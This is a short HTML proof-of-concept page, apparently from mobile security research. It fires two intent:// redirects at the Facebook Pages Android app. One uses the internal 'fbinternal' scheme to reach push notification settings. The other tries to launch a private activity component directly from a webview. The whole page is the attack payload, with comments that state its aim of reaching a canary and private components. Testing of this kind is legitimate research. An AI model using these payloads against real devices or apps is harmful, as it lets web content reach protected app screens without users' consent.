<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Intent Redirection Test</title>
</head>
<body>
    <h2>Testing intent:// redirection</h2>
    <button onclick="fireIntent1()">Test 1: Basic Intent</button>
    <button onclick="fireIntent2()">Test 2: Component Intent</button>
    <div id="log"></div>

    <script>
        function log(msg) { document.getElementById('log').innerHTML += msg + "<br>"; }

        function fireIntent1() {
            log("Firing intent:// with fbinternal scheme...");
            // Trying to hit the canary via intent scheme
            window.location.href = "intent://pma/push_notification_settings#Intent;scheme=fbinternal;package=com.facebook.pages.app;end";
        }

        function fireIntent2() {
            log("Firing intent:// direct to component...");
            // Trying to directly launch a private component from the webview
            window.location.href = "intent:#Intent;component=com.facebook.pages.app/com.facebook.pages.app.pushnotifications.settings.activity.PagesPushNotificationSettingsActivity;end";
        }
    </script>
</body>
</html>
